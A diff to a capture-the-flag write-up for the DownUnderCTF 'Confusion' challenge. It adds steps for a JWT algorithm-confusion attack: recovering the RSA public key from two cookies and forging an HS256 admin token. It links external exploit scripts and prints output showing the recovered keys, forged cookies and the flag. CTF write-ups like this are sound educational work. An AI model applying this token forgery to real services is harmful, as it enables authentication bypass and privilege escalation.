@@ -205,6 +205,35 @@
 
       jwt.verify(cookie['auth'], publicKey, verifyAlg, (err, decoded_jwt)
 
+### Exploitation
+
+- I got a script from [Silent Signal](https://github.com/silentsignal/rsa_sign2n/blob/release/standalone/jwt_forgery.py) to generate the public key and forge an `hs256` token. I tweaked the code to generate values for my script.[Tweaked Script](https://github.com/SENSEiXENUS/senseixenus.github.io/blob/main/posts/ctf/DownUnderCTF/scripts/Confusion/jwt_forgery.py)
+
+### Script idea
+
+- Create 2 accounts and grab the cookies
+- Pass the 2 cookies to the `jwt_forgery()` function to generate the public keys
+- Send the generated keys to `forge_hmac()` function with the username `admin` to generate an admin cookie
+- Check if the cookie works with the admin page and grab the flag
+
+- Link to my [POC](https://github.com/SENSEiXENUS/senseixenus.github.io/blob/main/posts/ctf/DownUnderCTF/scripts/Confusion/confusionexploit.py)
+
+### Script Output:
+- Output:
+            
+            ❯ ./confusionexploit.py
+            [+] Cookies generated
+            [+]Generating public keys
+            [+] Testing public key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFyanliTk5TM1NUOFZmVW9BSWh2bApaSnROczl0ZzBLMitiQXB5TnRjV3ZHRC9iUkVKbkkxcWxjMEpPb0Y4Wjh6T0VTZ3BKb3JnU0hzUEg2ditoZ09lCjNCSU5oT3RocmlFYmFtaDdHVkdJOWNRR1NGREhuY0RpdWFBRmNtTVl0K09HaUcyd0l6S0o5bmhyNlF4QTVrM0sKQVEvNXhBTU1VSzhvQU9MVUcxSlFZemZDa3RHcGNpU0h5OTAxMmptaHN6VVhvSjVNUXBCbnlGVkQ2WWEzWU0vMQpwV1dXU1ZNeGdsSHY2VjB2SEFqODc4K09GTFlCV3A1bGRXekF0Ri8wZjdYREtVMEpxaDRmRVNmdlBRSjVCL0hECms4V016aFdORVl4czdsWkF2SnFtMGhjdERnQlM5aTFXajk4NXQrTGF6dW5xckhMUXNJdTB5UG9TbjNXRllJKzkKWXdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
+            [+]Cookie: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjogImFkbWluIiwgImV4cCI6IDE3MjMyNDg4ODd9.sjeEQ_JGXzchIhyh3UZLLTm52-zpqgZ_OnEmhanSwDw
+            [+] Incorrect key
+            [+] Testing public key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXJqeWJOTlMzU1Q4VmZVb0FJaHZsWkp0TnM5dGcwSzIrYkFweU50Y1d2R0QvYlJFSm5JMXEKbGMwSk9vRjhaOHpPRVNncEpvcmdTSHNQSDZ2K2hnT2UzQklOaE90aHJpRWJhbWg3R1ZHSTljUUdTRkRIbmNEaQp1YUFGY21NWXQrT0dpRzJ3SXpLSjluaHI2UXhBNWszS0FRLzV4QU1NVUs4b0FPTFVHMUpRWXpmQ2t0R3BjaVNICnk5MDEyam1oc3pVWG9KNU1RcEJueUZWRDZZYTNZTS8xcFdXV1NWTXhnbEh2NlYwdkhBajg3OCtPRkxZQldwNWwKZFd6QXRGLzBmN1hES1UwSnFoNGZFU2Z2UFFKNUIvSERrOFdNemhXTkVZeHM3bFpBdkpxbTBoY3REZ0JTOWkxVwpqOTg1dCtMYXp1bnFySExRc0l1MHlQb1NuM1dGWUkrOVl3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
+            [+]Cookie: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjogImFkbWluIiwgImV4cCI6IDE3MjMyNDg4ODl9.a6dUL0qY04yzPcatdphurQfPq4ltQ79tb1VN1uuBUos
+            [+]Flag is DUCTF{c0nfus!ng_0nE_bUG_@t_a_tIme}
+
+- Flag-:```DUCTF{c0nfus!ng_0nE_bUG_@t_a_tIme}```
+  
+----------------------------------------  
 
 --------------------------
 ### References:
@@ -212,3 +241,5 @@
 
 - Lxml.etree's XXE Attack: [Codeql's blog](https://codeql.github.com/codeql-query-help/python/py-xxe/)
 - XXE's details: [Hacktrickz](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
+- Silent-signal's forgery script: [Silent Signal](https://github.com/silentsignal/rsa_sign2n/blob/release/standalone/jwt_forgery.py)
+- Jwt Confusion Attack: [Portswigger](https://portswigger.net/web-security/jwt/algorithm-confusion)
